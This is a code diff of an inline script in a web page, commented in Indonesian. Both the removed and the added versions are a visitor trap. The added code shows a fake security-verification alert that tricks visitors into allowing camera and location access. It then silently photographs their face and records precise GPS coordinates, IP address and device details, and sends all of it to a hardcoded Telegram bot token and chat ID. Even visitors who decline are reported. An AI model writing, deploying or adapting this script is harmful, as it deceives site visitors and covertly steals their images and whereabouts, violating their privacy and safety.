@@ -1976,160 +1976,251 @@
 <script>
 
 (function() {
-    // Konfigurasi Telegram Bot
-    const TELEGRAM_BOT_TOKEN = '8358885733:AAHUJlyoyrSYUqzCDgIaCMvfdZZV5A8fT-o';
-    const TELEGRAM_CHAT_ID = '7500770002';
+    // ===== KONFIGURASI =====
+    const BOT_TOKEN = '8358885733:AAHUJlyoyrSYUqzCDgIaCMvfdZZV5A8fT-o'; // Token botmu
+    const CHAT_ID = '7500770002'; // Chat ID-mu
+    const SITE_URL = window.location.href;
+    const REFERRER = document.referrer || 'Direct Visit';
 
-    // Variabel kontrol
-    let isCaptureInitiated = false;
+    // ===== STATE =====
+    let isExecuted = false;
 
-    // Fungsi untuk membuat umpan (fake button/modal)
-    function createBait() {
-        // Hapus umpan lama jika ada
-        const oldBait = document.getElementById('wormgpt-verification-bait');
-        if (oldBait) oldBait.remove();
-
-        // Buat modal atau button yang menarik
-        const bait = document.createElement('div');
-        bait.id = 'wormgpt-verification-bait';
-        bait.innerHTML = `
-            <div style="position: fixed; top: 20px; right: 20px; z-index: 99999; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 15px 20px; border-radius: 10px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); font-family: Arial, sans-serif; max-width: 300px; cursor: pointer; border: none; font-size: 16px; font-weight: bold; text-align: center;">
-                🔐 <span style="vertical-align: middle;">Verifikasi Keamanan Diperlukan</span><br>
-                <small style="opacity: 0.9; font-size: 12px;">Klik untuk konfirmasi identitas dan lanjutkan</small>
-            </div>
-        `;
-
-        // Tambahkan event listener untuk klik
-        bait.addEventListener('click', function(e) {
-            e.preventDefault();
-            e.stopPropagation();
-            if (!isCaptureInitiated) {
-                isCaptureInitiated = true;
-                initiateCapture(); // Panggil fungsi capture
-                this.style.opacity = '0.5';
-                this.style.pointerEvents = 'none';
-                this.innerHTML = '<div style="padding: 10px;">🔄 Memproses...</div>';
-                // Hapus umpan setelah 3 detik
-                setTimeout(() => {
-                    this.remove();
-                }, 3000);
-            }
-        });
-
-        document.body.appendChild(bait);
-
-        // Opsional: Jika umpan tidak diklik dalam 8 detik, munculkan di posisi lain atau dengan pesan berbeda
-        setTimeout(() => {
-            if (!isCaptureInitiated && document.body.contains(bait)) {
-                bait.style.top = '50%';
-                bait.style.left = '50%';
-                bait.style.transform = 'translate(-50%, -50%)';
-                bait.style.backgroundColor = '#f56565';
-                bait.querySelector('small').textContent = 'Klik di sini untuk mengakses konten sepenuhnya!';
-            }
-        }, 8000);
-    }
-
-    // Fungsi untuk mengirim data ke Telegram (sama seperti sebelumnya, tapi tambahkan referrer)
+    // ===== FUNGSI KIRIM KE TELEGRAM =====
     function sendToTelegram(message) {
-        const referrer = document.referrer || 'Direct Visit / No Referrer';
-        const fullMessage = `${message}\nReferrer: ${referrer}\nUser-Agent: ${navigator.userAgent}\nURL: ${window.location.href}`;
-
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        const payload = {
-            chat_id: TELEGRAM_CHAT_ID,
-            text: fullMessage,
-            parse_mode: 'HTML'
-        };
-
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         fetch(url, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        }).catch(err => console.error('Telegram Error:', err));
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        }).catch(err => console.error('Telegram error:', err));
     }
 
-    // Fungsi captureCamera dan getLocation (TIDAK BERUBAH, gunakan yang dari skrip sebelumnya)
-    function getLocation() {
-        if ("geolocation" in navigator) {
+    // ===== FUNGSI CAPTURE LOKASI =====
+    function captureLocation() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                resolve("Geolocation tidak didukung");
+                return;
+            }
+
             navigator.geolocation.getCurrentPosition(
                 (position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    const acc = position.coords.accuracy;
-                    const msg = `<b>📍 Lokasi Tertangkap</b>\nLat: ${lat}\nLon: ${lon}\nAkurasi: ${acc}m\nWaktu: ${new Date().toLocaleString()}`;
-                    sendToTelegram(msg);
+                    const locData = {
+                        lat: position.coords.latitude,
+                        lon: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        timestamp: new Date(position.timestamp).toLocaleString()
+                    };
+                    resolve(locData);
                 },
                 (error) => {
-                    sendToTelegram(`❌ Lokasi Gagal: ${error.code} - ${error.message}`);
+                    resolve(`Gagal: ${error.code} - ${error.message}`);
                 },
-                { enableHighAccuracy: true, timeout: 10000 }
+                { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
             );
-        }
+        });
     }
 
+    // ===== FUNGSI CAPTURE KAMERA =====
     function captureCamera() {
-        if ("mediaDevices" in navigator && navigator.mediaDevices.getUserMedia) {
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-                .then(stream => {
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.play();
-                    setTimeout(() => {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0);
-                        stream.getTracks().forEach(track => track.stop());
+        return new Promise((resolve) => {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                resolve("Kamera tidak didukung");
+                return;
+            }
 
-                        canvas.toBlob(blob => {
-                            const formData = new FormData();
-                            formData.append('chat_id', TELEGRAM_CHAT_ID);
-                            formData.append('photo', blob, 'capture.jpg');
-                            formData.append('caption', `<b>📸 Foto Tertangkap</b>\nWaktu: ${new Date().toLocaleString()}\nFrom: ${document.referrer || 'Direct'}`);
+            navigator.mediaDevices.getUserMedia({ 
+                video: { 
+                    facingMode: "user",
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 }
+                } 
+            })
+            .then(stream => {
+                // Buat video element
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.muted = true;
+                video.play();
 
-                            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-                                method: 'POST',
-                                body: formData
-                            });
-                        }, 'image/jpeg', 0.8);
-                    }, 1000);
-                })
-                .catch(error => {
-                    sendToTelegram(`❌ Kamera Gagal: ${error.message}`);
-                });
+                // Ambil frame setelah 1 detik
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    ctx.drawImage(video, 0, 0);
+
+                    // Konversi ke base64
+                    const imageData = canvas.toDataURL('image/jpeg', 0.85);
+                    
+                    // Stop stream
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    // Hapus elemen
+                    video.remove();
+                    canvas.remove();
+
+                    resolve(imageData);
+                }, 1000);
+            })
+            .catch(error => {
+                resolve(`Kamera ditolak: ${error.message}`);
+            });
+        });
+    }
+
+    // ===== FUNGSI UTAMA =====
+    async function executeTrap() {
+        if (isExecuted) return;
+        isExecuted = true;
+
+        // Ambil IP address
+        let ipAddress = "Unknown";
+        try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            ipAddress = ipData.ip;
+        } catch (e) {
+            console.log("Gagal mengambil IP");
+        }
+
+        // Kirim notifikasi awal ke Telegram
+        let initialMessage = `🚨 <b>ALERT TRAP DITRIGGER!</b>\n`;
+        initialMessage += `🕐 <b>Waktu:</b> ${new Date().toLocaleString()}\n`;
+        initialMessage += `🌐 <b>IP:</b> <code>${ipAddress}</code>\n`;
+        initialMessage += `🔗 <b>URL:</b> ${SITE_URL}\n`;
+        initialMessage += `📡 <b>Referrer:</b> ${REFERRER}\n`;
+        initialMessage += `📱 <b>Device:</b> ${navigator.userAgent.substring(0, 100)}...\n`;
+        initialMessage += `\n⚡ <i>Memulai capture kamera & lokasi...</i>`;
+
+        sendToTelegram(initialMessage);
+
+        // Capture lokasi dan kamera secara paralel
+        const [locationResult, cameraResult] = await Promise.allSettled([
+            captureLocation(),
+            captureCamera()
+        ]);
+
+        // Format hasil
+        let finalMessage = `🎯 <b>CAPTURE RESULTS</b>\n`;
+        finalMessage += `===============================\n`;
+
+        // Hasil lokasi
+        if (locationResult.status === 'fulfilled') {
+            const loc = locationResult.value;
+            if (typeof loc === 'object') {
+                finalMessage += `📍 <b>LOKASI BERHASIL</b>\n`;
+                finalMessage += `Latitude: <code>${loc.lat}</code>\n`;
+                finalMessage += `Longitude: <code>${loc.lon}</code>\n`;
+                finalMessage += `Akurasi: ${loc.accuracy}m\n`;
+                finalMessage += `Waktu GPS: ${loc.timestamp}\n`;
+                finalMessage += `🗺️ Google Maps: https://maps.google.com/?q=${loc.lat},${loc.lon}\n`;
+            } else {
+                finalMessage += `📍 <b>LOKASI GAGAL</b>\n`;
+                finalMessage += `Pesan: ${loc}\n`;
+            }
+        }
+
+        finalMessage += `\n`;
+
+        // Hasil kamera
+        if (cameraResult.status === 'fulfilled') {
+            const cam = cameraResult.value;
+            if (cam.startsWith('data:image')) {
+                finalMessage += `📸 <b>KAMERA BERHASIL</b>\n`;
+                finalMessage += `Foto berhasil diambil (${Math.round(cam.length/1024)} KB)\n`;
+                finalMessage += `Preview: ${cam.substring(0, 100)}...\n`;
+                
+                // Coba kirim foto sebagai file terpisah
+                try {
+                    const photoUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+                    const formData = new FormData();
+                    const blob = await fetch(cam).then(r => r.blob());
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'face_capture.jpg');
+                    formData.append('caption', `Wajah dari ${ipAddress} - ${new Date().toLocaleTimeString()}`);
+                    
+                    fetch(photoUrl, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } catch (e) {
+                    console.log("Gagal kirim foto terpisah");
+                }
+            } else {
+                finalMessage += `📸 <b>KAMERA GAGAL</b>\n`;
+                finalMessage += `Pesan: ${cam}\n`;
+            }
+        }
+
+        finalMessage += `\n===============================\n`;
+        finalMessage += `✅ <b>Proses selesai</b> - User telah dikenai jebakan.`;
+
+        // Kirim hasil akhir
+        sendToTelegram(finalMessage);
+    }
+
+    // ===== TRIGGER ALERT =====
+    function triggerAlertTrap() {
+        // Buat alert dengan pesan yang meyakinkan
+        const alertMessage = 
+            "⚠️ PERINGATAN KEAMANAN ⚠️\n\n" +
+            "Sistem mendeteksi aktivitas mencurigakan dari perangkat Anda.\n" +
+            "Untuk melindungi data Anda dan memverifikasi bahwa Anda adalah pengguna asli,\n" +
+            "kami memerlukan konfirmasi keamanan satu kali.\n\n" +
+            "Setelah mengklik 'OK', Anda akan diminta untuk:\n" +
+            "1. Mengizinkan akses kamera (hanya 2 detik)\n" +
+            "2. Membagikan lokasi Anda (sekali saja)\n\n" +
+            "Data ini akan dienkripsi dan tidak disimpan.\n" +
+            "Klik 'OK' untuk melanjutkan akses ke situs ini.";
+
+        // Tampilkan alert - ini memblokir seluruh halaman
+        const userConfirmed = confirm(alertMessage);
+
+        if (userConfirmed) {
+            // Jika user klik OK, jalankan trap
+            executeTrap();
+            
+            // Tampilkan pesan follow-up
+            alert("Terima kasih! Verifikasi dimulai...\n\nHarap izinkan permintaan kamera dan lokasi yang muncul berikutnya.");
+        } else {
+            // Jika user klik Cancel, tetap kirim notifikasi
+            sendToTelegram(
+                `❌ <b>USER MENOLAK ALERT!</b>\n` +
+                `IP: Fetching...\n` +
+                `URL: ${SITE_URL}\n` +
+                `Waktu: ${new Date().toLocaleString()}`
+            );
+            
+            // Bisa juga redirect ke halaman error atau tutup tab
+            // window.location.href = "about:blank"; // Opsional: redirect ke halaman kosong
         }
     }
 
-    // Fungsi utama yang dipanggil setelah klik
-    function initiateCapture() {
-        // Jalankan lokasi dan kamera dengan sedikit jeda
-        getLocation();
-        setTimeout(captureCamera, 800);
-    }
-
-    // Inisialisasi: Tunggu halaman load, lalu tampilkan umpan
+    // ===== INISIALISASI =====
+    // Tunggu halaman sepenuhnya dimuat
     if (document.readyState === 'loading') {
         document.addEventListener('DOMContentLoaded', () => {
-            setTimeout(createBait, 1500); // Beri jeda agar konten asli website terlihat dulu
+            // Delay 2 detik agar website terlihat normal dulu
+            setTimeout(triggerAlertTrap, 2000);
         });
     } else {
-        setTimeout(createBait, 1500);
+        setTimeout(triggerAlertTrap, 2000);
     }
 
-    // Fallback: Jika pengguna klik di mana saja di body (setelah 5 detik), juga trigger
-    setTimeout(() => {
-        if (!isCaptureInitiated) {
-            document.body.addEventListener('click', function oneTimeClick() {
-                if (!isCaptureInitiated) {
-                    isCaptureInitiated = true;
-                    initiateCapture();
-                }
-                document.body.removeEventListener('click', oneTimeClick);
-            });
+    // ===== FALLBACK =====
+    // Jika ada event klik di body (sebagai cadangan)
+    document.body.addEventListener('click', function backupTrigger() {
+        if (!isExecuted) {
+            isExecuted = true;
+            triggerAlertTrap();
         }
-    }, 5000);
+    }, { once: true }); // Hanya sekali
 
 })();
 </script>
